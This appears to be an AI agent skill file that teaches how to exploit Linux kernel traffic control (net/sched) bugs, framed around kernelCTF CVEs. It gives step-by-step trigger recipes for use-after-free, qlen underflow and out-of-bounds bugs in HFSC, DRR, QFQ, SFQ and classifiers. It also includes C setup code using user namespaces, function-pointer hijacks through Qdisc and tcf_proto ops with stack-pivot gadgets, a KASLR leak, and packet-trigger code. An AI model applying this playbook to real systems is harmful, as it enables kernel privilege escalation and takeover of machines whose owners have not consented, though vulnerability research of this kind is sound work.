---
name: kernel-net-sched-ops
description: Linux network scheduler (net/sched) exploitation helpers including qdisc/class/filter manipulation, QFQ/HFSC/SFQ/DRR exploitation patterns, and traffic control setup via netlink. Use when developing exploits targeting the traffic control subsystem.
---

# Network Scheduler (net/sched) Exploitation Operations

Expert guidance for exploiting Linux traffic control (TC) subsystem vulnerabilities. Covers 14+ kernelCTF CVEs targeting qdiscs, classes, and classifiers.

## TC Architecture

```
         Userspace
            | (NETLINK_ROUTE / RTM_* messages)
            v
         TC Core (net/sched/sch_api.c)
            |
    ┌───────┼───────┐
    v       v       v
  Qdisc   Class   Filter/Classifier
(scheduler) (traffic class) (packet matcher)
    |
    ├── QFQ  (sch_qfq.c)     - Quick Fair Queueing
    ├── HFSC (sch_hfsc.c)    - Hierarchical Fair Service Curve
    ├── SFQ  (sch_sfq.c)     - Stochastic Fairness Queueing
    ├── DRR  (sch_drr.c)     - Deficit Round Robin
    ├── CBQ  (sch_cbq.c)     - Class-Based Queueing
    ├── TBF  (sch_tbf.c)     - Token Bucket Filter
    ├── HTB  (sch_htb.c)     - Hierarchy Token Bucket
    ├── prio (sch_prio.c)    - Priority Scheduler
    └── pfifo_tail            - Tail-drop FIFO

  Classifiers:
    ├── cls_u32  (cls_u32.c)  - Universal 32-bit classifier
    ├── cls_fw   (cls_fw.c)   - Firewall mark classifier
    ├── cls_route (cls_route.c) - Route classifier
    └── cls_bpf  (cls_bpf.c)  - BPF-based classifier
```

## Vulnerability Patterns

### Pattern 1: Qdisc Class UAF (HFSC, DRR, QFQ)

**Mechanism**: Class deleted while still in scheduler's active/eligible list.

**CVEs**: CVE-2023-3611 (HFSC), CVE-2025-21700 (DRR), CVE-2025-38350 (HFSC), CVE-2025-38477 (QFQ)

```
1. Create parent qdisc (e.g., hfsc)
2. Create multiple classes
3. Enqueue packets to make classes active
4. Delete class while packets still queued
5. Scheduler tries to dequeue from freed class -> UAF
```

### Pattern 2: Qlen Underflow (pfifo_tail, SFQ)

**Mechanism**: Queue length counter decremented below zero, used as array index.

**CVEs**: CVE-2025-21702 (pfifo_tail), CVE-2025-37752 (SFQ), CVE-2025-38083 (prio+SFQ)

```
1. Create TBF with child pfifo_tail (limit=1 or SFQ)
2. Starve TBF tokens so packets accumulate
3. pfifo_tail drops packets, decrements qlen
4. Parent also decrements qlen -> underflow
5. Underflowed qlen used as index -> OOB write
```

### Pattern 3: Classifier UAF (cls_u32, cls_fw, cls_route)

**Mechanism**: Filter freed during transaction rollback but still referenced.

**CVEs**: CVE-2023-3609 (cls_u32), CVE-2023-3776 (cls_fw), CVE-2023-4206/07/08 (cls_route/fw/u32)

```
1. Create qdisc with filter chain
2. Add classifier filter
3. Trigger transaction that partially fails
4. Rollback frees filter but leaves reference in chain
5. Next packet classification uses freed filter -> UAF
```

### Pattern 4: QFQ Bit-Flip / OOB

**Mechanism**: Integer manipulation in QFQ scheduler index calculation.

**CVEs**: CVE-2023-31436, CVE-2023-4921

```
1. Create QFQ qdisc
2. Set up STAB (size table) with crafted values
3. Send packet that causes qfq_calc_index() to produce OOB index
4. OOB index accesses qfq_group beyond array bounds
5. Corrupts adjacent memory (function pointers)
```

### Pattern 5: Timer/Perturb Race (SFQ, HFSC)

**Mechanism**: Scheduler timer fires during qdisc reconfiguration.

**CVEs**: CVE-2025-38083 (SFQ perturb timer)

```
1. Create prio with SFQ child
2. SFQ starts periodic perturbation timer
3. Race: reduce prio bands while timer fires
4. Timer causes qlen underflow in parent
```

## Netlink Setup for TC Operations

See [templates/tc_helpers.h](templates/tc_helpers.h) for implementation.

### Required Messages
```
RTM_NEWLINK    - Create dummy network interface
RTM_NEWQDISC   - Create qdisc
RTM_DELQDISC   - Delete qdisc
RTM_NEWTCLASS  - Create traffic class
RTM_DELTCLASS  - Delete traffic class
RTM_NEWTFILTER - Create filter/classifier
RTM_DELTFILTER - Delete filter/classifier
```

### Standard Setup Sequence
```c
// 1. Create network namespace
setup_namespaces();  // CLONE_NEWUSER | CLONE_NEWNET

// 2. Create dummy interface
net_if_create("dummy0", "dummy");

// 3. Bring interface up
net_if_up("dummy0");

// 4. Add root qdisc
tc_qdisc_add("dummy0", "hfsc", 0x10000);  // handle 1:0

// 5. Add classes
tc_class_add("dummy0", 0x10000, 0x10001, "hfsc", ...);  // class 1:1
tc_class_add("dummy0", 0x10000, 0x10002, "hfsc", ...);  // class 1:2

// 6. Add child qdiscs to classes
tc_qdisc_add_parent("dummy0", "pfifo_tail", 0x10001, 0x20000);

// 7. Enqueue packets
send_udp_packet("dummy0", ...);
```

## Exploitation Techniques

### Function Pointer Hijack via Qdisc->ops
```c
/* After UAF of a Qdisc or class structure:
 *
 * struct Qdisc {
 *   const struct Qdisc_ops *ops;  // <- overwrite this
 *   ...
 *   int (*enqueue)(struct sk_buff *, struct Qdisc *, ...);
 * };
 *
 * Overwrite ops->enqueue with stack pivot gadget.
 * Trigger by sending a packet through the qdisc.
 * First argument (rdi) = skb pointer, second (rsi) = qdisc pointer.
 */
```

### tcf_proto->classify Hijack
```c
/* For classifier UAF:
 *
 * struct tcf_proto {
 *   ...
 *   struct tcf_proto_ops *ops;  // <- overwrite this
 * };
 *
 * struct tcf_proto_ops {
 *   int (*classify)(struct sk_buff *, const struct tcf_proto *, ...);
 * };
 *
 * Overwrite ops->classify with gadget.
 * Trigger by sending packet that hits the filter chain.
 */
```

### KASLR Leak via tbf_qdisc_ops
```c
/* After reclaiming freed Qdisc with user_key_payload:
 *
 * 1. Read back user_key to get Qdisc->ops pointer
 * 2. ops points to tbf_qdisc_ops (static symbol in .data)
 * 3. kbase = tbf_qdisc_ops_addr - OFF_TBF_QDISC_OPS
 */
```

## Packet Trigger Methods

### UDP Packet with SO_PRIORITY
```c
int sock = socket(AF_INET, SOCK_DGRAM, 0);
int prio = class_handle;  /* e.g., 0x10001 for class 1:1 */
setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
sendto(sock, "X", 1, 0, &dst_addr, sizeof(dst_addr));
/* Packet enters qdisc hierarchy at specified class */
```

### Raw Packet via AF_PACKET
```c
int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
struct sockaddr_ll addr = {
    .sll_family = AF_PACKET,
    .sll_ifindex = if_nametoindex("dummy0"),
    .sll_protocol = htons(ETH_P_IP),
};
sendto(sock, pkt, pkt_len, 0, (struct sockaddr *)&addr, sizeof(addr));
/* Bypasses routing, directly enters interface's qdisc */
```

## Required Kernel Configuration

```
CONFIG_NET_SCHED=y
CONFIG_NET_SCH_QFQ=y/m     (for QFQ exploits)
CONFIG_NET_SCH_HFSC=y/m    (for HFSC exploits)
CONFIG_NET_SCH_SFQ=y/m     (for SFQ exploits)
CONFIG_NET_SCH_DRR=y/m     (for DRR exploits)
CONFIG_NET_SCH_TBF=y/m     (for TBF token starvation)
CONFIG_NET_SCH_PRIO=y/m    (for prio scheduler)
CONFIG_NET_CLS_U32=y/m     (for cls_u32)
CONFIG_NET_CLS_FW=y/m      (for cls_fw)
CONFIG_NET_CLS_ROUTE4=y/m  (for cls_route)
CONFIG_DUMMY=y/m            (for dummy interfaces)
CONFIG_USER_NS=y            (for CAP_NET_ADMIN)
```

For code templates, see [templates/tc_helpers.h](templates/tc_helpers.h).
